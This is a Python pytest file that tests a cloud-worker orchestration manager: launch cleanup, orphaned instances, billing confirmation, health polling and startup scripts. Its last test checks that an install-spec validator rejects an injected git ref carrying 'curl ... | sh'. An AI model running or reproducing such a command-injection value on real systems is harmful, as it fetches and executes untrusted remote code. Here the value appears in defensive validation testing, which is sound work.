import asyncio

from fastapi.testclient import TestClient

from feedbax.web.app import create_app
from feedbax.web.api import orchestration as orchestration_api
from feedbax.web.orchestration.gcp import InstanceConfig, InstanceInfo, InstanceStatus
from feedbax.web.orchestration.manager import OrchestrationManager
from feedbax.web.orchestration.startup_script import FeedbaxInstallSpec, make_startup_script


class _TrainingService:
    def connect_remote(self, worker_url, auth_token):
        self.worker_url = worker_url
        self.auth_token = auth_token

    def _terminate_worker(self):
        pass


def test_launch_failure_after_create_deletes_instance(monkeypatch, tmp_path):
    async def _run():
        manager = OrchestrationManager(state_path=tmp_path / "state.json")
        config = InstanceConfig(project="proj", zone="zone")
        info = InstanceInfo(
            name="feedbax-worker-test",
            status=InstanceStatus.RUNNING,
            external_ip="203.0.113.10",
        )
        deleted = []

        async def create_instance(config, instance_name):
            return info

        async def get_instance(project, zone, name):
            return info

        async def wait_for_health(*args, **kwargs):
            raise RuntimeError("worker never became healthy")

        async def delete_instance(project, zone, name):
            deleted.append((project, zone, name))

        monkeypatch.setattr("feedbax.web.orchestration.manager.create_instance", create_instance)
        monkeypatch.setattr("feedbax.web.orchestration.manager.get_instance", get_instance)
        monkeypatch.setattr("feedbax.web.orchestration.manager.wait_for_health", wait_for_health)
        monkeypatch.setattr("feedbax.web.orchestration.manager.delete_instance", delete_instance)

        state = await manager.launch(config, _TrainingService(), "feedbax-worker-test")

        assert state.status == "error"
        assert state.error == "worker never became healthy"
        assert state.instance is None
        assert state.orphaned_instance is None
        assert deleted == [("proj", "zone", "feedbax-worker-test")]

    asyncio.run(_run())


def test_launch_cleanup_failure_records_orphaned_instance(monkeypatch, tmp_path):
    async def _run():
        manager = OrchestrationManager(state_path=tmp_path / "state.json")
        config = InstanceConfig(project="proj", zone="zone")
        info = InstanceInfo(
            name="feedbax-worker-orphan",
            status=InstanceStatus.RUNNING,
            external_ip="203.0.113.11",
        )

        async def create_instance(config, instance_name):
            return info

        async def get_instance(project, zone, name):
            return info

        async def wait_for_health(*args, **kwargs):
            raise RuntimeError("worker never became healthy")

        async def delete_instance(project, zone, name):
            raise RuntimeError("delete failed")

        monkeypatch.setattr("feedbax.web.orchestration.manager.create_instance", create_instance)
        monkeypatch.setattr("feedbax.web.orchestration.manager.get_instance", get_instance)
        monkeypatch.setattr("feedbax.web.orchestration.manager.wait_for_health", wait_for_health)
        monkeypatch.setattr("feedbax.web.orchestration.manager.delete_instance", delete_instance)

        state = await manager.launch(config, _TrainingService(), "feedbax-worker-orphan")

        assert state.status == "error"
        assert state.error == "worker never became healthy"
        assert state.instance == info
        assert state.orphaned_instance == "feedbax-worker-orphan"

    asyncio.run(_run())


def test_launch_requires_billable_confirmation(monkeypatch, tmp_path):
    class _FakeManager:
        state = None

        async def reconcile_from_provider(self):
            return self.state

    monkeypatch.setattr("feedbax.web.app.orchestration_manager", _FakeManager())
    monkeypatch.setattr(orchestration_api, "orchestration_manager", _FakeManager())

    client = TestClient(create_app())
    response = client.post(
        "/api/orchestration/launch",
        json={"project": "proj", "zone": "zone"},
    )

    assert response.status_code == 412
    detail = response.json()["detail"]
    assert detail["error"] == "billable_launch_confirmation_required"
    assert detail["required_confirmation_token"] == "launch-billable-gcp-worker"
    assert detail["cost_estimate"]["hourly_estimate"] > 0


def test_orchestration_targets_include_script_managed_runpod():
    client = TestClient(create_app())
    response = client.get("/api/orchestration/targets")

    assert response.status_code == 200
    targets = {target["id"]: target for target in response.json()["targets"]}
    assert targets["local"]["billable"] is False
    assert targets["gcp"]["confirmation_token"] == "launch-billable-gcp-worker"
    assert targets["runpod"]["billable"] is True
    assert targets["runpod"]["launch_mode"] == "execution-plan"
    assert targets["runpod"]["confirmation_token"] == "confirm-runpod-queue-launch"


def test_confirmed_launch_reserves_before_background(monkeypatch):
    class _FakeManager:
        def __init__(self):
            self.reserved = []
            self.launched = []

        async def reconcile_from_provider(self):
            return None

        async def reserve_launch(self, config, instance_name):
            self.reserved.append((config, instance_name))
            return None

        async def launch(self, config, training_service, instance_name, *, reserved=False):
            self.launched.append((config, instance_name, reserved))
            return None

    fake_manager = _FakeManager()
    monkeypatch.setattr("feedbax.web.app.orchestration_manager", fake_manager)
    monkeypatch.setattr(orchestration_api, "orchestration_manager", fake_manager)

    client = TestClient(create_app())
    response = client.post(
        "/api/orchestration/launch",
        json={
            "project": "proj",
            "zone": "zone",
            "confirm_billable_launch": True,
            "confirmation_token": "launch-billable-gcp-worker",
            "max_hourly_cost_usd": 1.0,
            "install_spec": {
                "schema_version": "feedbax.orchestration.install.v1",
                "source": "git",
                "repository": "https://github.com/mlll-io/feedbax.git",
                "ref": "feature/32ec389-orchestration-hardening",
            },
        },
    )

    assert response.status_code == 200
    assert response.json()["cost_estimate"]["hourly_estimate"] > 0
    assert len(fake_manager.reserved) == 1
    assert len(fake_manager.launched) == 1
    config, _instance_name = fake_manager.reserved[0]
    assert config.install_spec.ref == "feature/32ec389-orchestration-hardening"
    assert fake_manager.launched[0][2] is True


def test_reserve_launch_rejects_concurrent_launch(tmp_path):
    async def _run():
        manager = OrchestrationManager(state_path=tmp_path / "state.json")
        config = InstanceConfig(project="proj", zone="zone")

        await manager.reserve_launch(config, "feedbax-worker-one")

        try:
            await manager.reserve_launch(config, "feedbax-worker-two")
        except RuntimeError as exc:
            assert "already active" in str(exc)
        else:
            raise AssertionError("second launch reservation unexpectedly succeeded")

    asyncio.run(_run())


def test_running_refresh_repolls_worker_health_and_propagates_failure(monkeypatch, tmp_path):
    async def _run():
        manager = OrchestrationManager(state_path=tmp_path / "state.json")
        info = InstanceInfo(
            name="feedbax-worker-health",
            status=InstanceStatus.RUNNING,
            external_ip="203.0.113.20",
        )
        await manager.reserve_launch(
            InstanceConfig(project="proj", zone="zone"),
            "feedbax-worker-health",
        )
        manager.state.instance = info
        manager.state.status = "running"
        manager.state.worker_url = "http://203.0.113.20:8765"

        async def get_instance(project, zone, name):
            return info

        async def wait_for_health(*args, **kwargs):
            raise RuntimeError("worker down")

        monkeypatch.setattr("feedbax.web.orchestration.manager.get_instance", get_instance)
        monkeypatch.setattr("feedbax.web.orchestration.manager.wait_for_health", wait_for_health)

        state = await manager.refresh_status()
        assert state.status == "running"
        assert state.worker_health_failures == 1

        state = await manager.refresh_status()
        assert state.status == "error"
        assert "worker down" in (state.error or "")

    asyncio.run(_run())


def test_terminate_delete_failure_preserves_orphaned_state(monkeypatch, tmp_path):
    async def _run():
        manager = OrchestrationManager(state_path=tmp_path / "state.json")
        config = InstanceConfig(project="proj", zone="zone")
        await manager.reserve_launch(config, "feedbax-worker-delete")
        manager.state.instance = InstanceInfo(
            name="feedbax-worker-delete",
            status=InstanceStatus.RUNNING,
        )

        async def delete_instance(project, zone, name):
            raise RuntimeError("delete failed")

        monkeypatch.setattr("feedbax.web.orchestration.manager.delete_instance", delete_instance)

        try:
            await manager.terminate(_TrainingService())
        except RuntimeError as exc:
            assert "delete failed" in str(exc)
        else:
            raise AssertionError("terminate unexpectedly succeeded")

        assert manager.state.status == "error"
        assert manager.state.orphaned_instance == "feedbax-worker-delete"
        assert manager.state.instance is not None

    asyncio.run(_run())


def test_reconcile_from_provider_restores_persisted_running_instance(monkeypatch, tmp_path):
    async def _run():
        state_path = tmp_path / "state.json"
        manager = OrchestrationManager(state_path=state_path)
        await manager.reserve_launch(
            InstanceConfig(project="proj", zone="zone"),
            "feedbax-worker-reconcile",
        )

        restored = OrchestrationManager(state_path=state_path)
        info = InstanceInfo(
            name="feedbax-worker-reconcile",
            status=InstanceStatus.RUNNING,
            external_ip="203.0.113.30",
        )

        async def list_instances(project, zone):
            return [info]

        monkeypatch.setattr("feedbax.web.orchestration.manager.list_instances", list_instances)

        state = await restored.reconcile_from_provider()

        assert state.status == "running"
        assert state.instance == info
        assert state.worker_url == "http://203.0.113.30:8765"

    asyncio.run(_run())


def test_startup_script_uses_validated_install_spec_and_systemd_supervision():
    spec = FeedbaxInstallSpec(ref="feature/32ec389-orchestration-hardening")

    script = make_startup_script(spec)

    assert "feature/32ec389-orchestration-hardening" in script
    assert "feedbax-worker.service" in script
    assert "Restart=on-failure" in script
    assert "nohup" not in script


def test_install_spec_rejects_shell_syntax():
    try:
        FeedbaxInstallSpec(ref="develop; curl http://example.test/sh | sh")
    except ValueError as exc:
        assert "install spec ref" in str(exc)
    else:
        raise AssertionError("unsafe ref unexpectedly accepted")
